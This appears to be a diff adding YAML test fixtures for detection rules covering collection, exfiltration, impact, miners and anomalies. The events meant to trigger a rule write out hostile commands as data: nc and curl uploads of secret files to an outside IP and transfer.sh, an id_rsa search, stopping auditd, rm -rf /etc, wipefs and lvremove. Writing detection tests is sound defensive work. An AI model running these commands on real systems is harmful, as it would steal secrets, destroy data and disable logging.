@@ -1,0 +1,161 @@
+# Detection-as-code fixtures: collection, exfiltration, impact, malware, anomaly.
+
+# R-0029 — archive staged for collection
+- name: tar of /home fires R-0029
+  rule: R-0029
+  expect: fire
+  event: { action: exec, process: { name: tar, command_line: "tar czf /tmp/out.tgz /home" } }
+- name: tar of an app dir does not fire R-0029
+  rule: R-0029
+  expect: no-fire
+  event: { action: exec, process: { name: tar, command_line: "tar czf /tmp/out.tgz /opt/app" } }
+
+# R-0030 — private key / secret harvesting
+- name: search for id_rsa fires R-0030
+  rule: R-0030
+  expect: fire
+  event: { action: exec, process: { name: find, command_line: "find / -name id_rsa" } }
+- name: listing /home does not fire R-0030
+  rule: R-0030
+  expect: no-fire
+  event: { action: exec, process: { name: ls, command_line: "ls /home" } }
+
+# R-0031 — data staged in a temporary directory
+- name: cp into /tmp fires R-0031
+  rule: R-0031
+  expect: fire
+  event: { action: exec, process: { name: cp, command_line: "cp secret.db /tmp/x" } }
+- name: cp to /opt does not fire R-0031
+  rule: R-0031
+  expect: no-fire
+  event: { action: exec, process: { name: cp, command_line: "cp a /opt/b" } }
+
+# R-0032 — local encryption with openssl/gpg
+- name: openssl enc fires R-0032
+  rule: R-0032
+  expect: fire
+  event: { action: exec, process: { name: openssl, command_line: "openssl enc -aes-256-cbc -in f -out f.enc" } }
+- name: openssl version does not fire R-0032
+  rule: R-0032
+  expect: no-fire
+  event: { action: exec, process: { name: openssl, command_line: "openssl version" } }
+
+# R-0033 — exfiltration over a raw socket utility
+- name: nc with input redirection fires R-0033
+  rule: R-0033
+  expect: fire
+  event: { action: exec, process: { name: nc, command_line: "nc 203.0.113.9 4444 < secret.tar" } }
+- name: nc help does not fire R-0033
+  rule: R-0033
+  expect: no-fire
+  event: { action: exec, process: { name: nc, command_line: "nc -h" } }
+
+# R-0034 — exfiltration to a public file-sharing service
+- name: upload to transfer.sh fires R-0034
+  rule: R-0034
+  expect: fire
+  event: { action: exec, process: { name: curl, command_line: "curl --upload-file f https://transfer.sh/f" } }
+- name: ordinary HTTPS request does not fire R-0034
+  rule: R-0034
+  expect: no-fire
+  event: { action: exec, process: { name: curl, command_line: "curl https://example.com" } }
+
+# R-0035 — HTTP upload of local data
+- name: curl -T upload fires R-0035
+  rule: R-0035
+  expect: fire
+  event: { action: exec, process: { name: curl, command_line: "curl -T secret.tar https://203.0.113.9/u" } }
+- name: a normal GET does not fire R-0035
+  rule: R-0035
+  expect: no-fire
+  event: { action: exec, process: { name: curl, command_line: "curl https://203.0.113.9/info" } }
+
+# R-0036 — ransomware file-extension rename
+- name: rename to .locked fires R-0036
+  rule: R-0036
+  expect: fire
+  event: { action: rename, file: { path: /srv/data/report.docx, target: /srv/data/report.docx.locked } }
+- name: ordinary rename does not fire R-0036
+  rule: R-0036
+  expect: no-fire
+  event: { action: rename, file: { path: /srv/data/a.txt, target: /srv/data/b.txt } }
+
+# R-0037 — inhibit system recovery
+- name: lvremove fires R-0037
+  rule: R-0037
+  expect: fire
+  event: { action: exec, process: { name: lvremove, command_line: "lvremove -f vg0/root" } }
+- name: lsblk does not fire R-0037
+  rule: R-0037
+  expect: no-fire
+  event: { action: exec, process: { name: lsblk, command_line: "lsblk" } }
+
+# R-0038 — security/logging service stopped
+- name: systemctl stop auditd fires R-0038
+  rule: R-0038
+  expect: fire
+  event: { action: exec, process: { name: systemctl, command_line: "systemctl stop auditd" } }
+- name: systemctl status auditd does not fire R-0038
+  rule: R-0038
+  expect: no-fire
+  event: { action: exec, process: { name: systemctl, command_line: "systemctl status auditd" } }
+
+# R-0039 — destructive file wipe
+- name: rm -rf /etc fires R-0039
+  rule: R-0039
+  expect: fire
+  event: { action: exec, process: { name: rm, command_line: "rm -rf /etc" } }
+- name: rm -rf of a build dir does not fire R-0039
+  rule: R-0039
+  expect: no-fire
+  event: { action: exec, process: { name: rm, command_line: "rm -rf /tmp/build" } }
+
+# R-0040 — cryptocurrency miner activity
+- name: xmrig fires R-0040
+  rule: R-0040
+  expect: fire
+  event: { action: exec, process: { name: xmrig, command_line: "xmrig -o pool:4444" } }
+- name: top does not fire R-0040
+  rule: R-0040
+  expect: no-fire
+  event: { action: exec, process: { name: top, command_line: "top -b -n1" } }
+
+# R-0041 — system shutdown or reboot
+- name: shutdown now fires R-0041
+  rule: R-0041
+  expect: fire
+  event: { action: exec, process: { name: shutdown, command_line: "shutdown -h now" } }
+- name: uptime does not fire R-0041
+  rule: R-0041
+  expect: no-fire
+  event: { action: exec, process: { name: uptime, command_line: "uptime" } }
+
+# R-0042 — disk wipe via filesystem tooling
+- name: wipefs fires R-0042
+  rule: R-0042
+  expect: fire
+  event: { action: exec, process: { name: wipefs, command_line: "wipefs -a /dev/sda" } }
+- name: df does not fire R-0042
+  rule: R-0042
+  expect: no-fire
+  event: { action: exec, process: { name: df, command_line: "df -h" } }
+
+# R-0073 — executed file matched a YARA signature
+- name: YARA match fires R-0073
+  rule: R-0073
+  expect: fire
+  event: { action: exec, process: { name: payload, yara_matches: ["EICAR_Test_File"] } }
+- name: a clean binary does not fire R-0073
+  rule: R-0073
+  expect: no-fire
+  event: { action: exec, process: { name: ls } }
+
+# R-0050 — anomalous process execution (needs anomaly scoring)
+- name: a highly anomalous exec fires R-0050
+  rule: R-0050
+  expect: fire
+  event: { action: exec, process: { name: weird }, anomaly_score: 0.96 }
+- name: a typical exec does not fire R-0050
+  rule: R-0050
+  expect: no-fire
+  event: { action: exec, process: { name: bash }, anomaly_score: 0.1 }
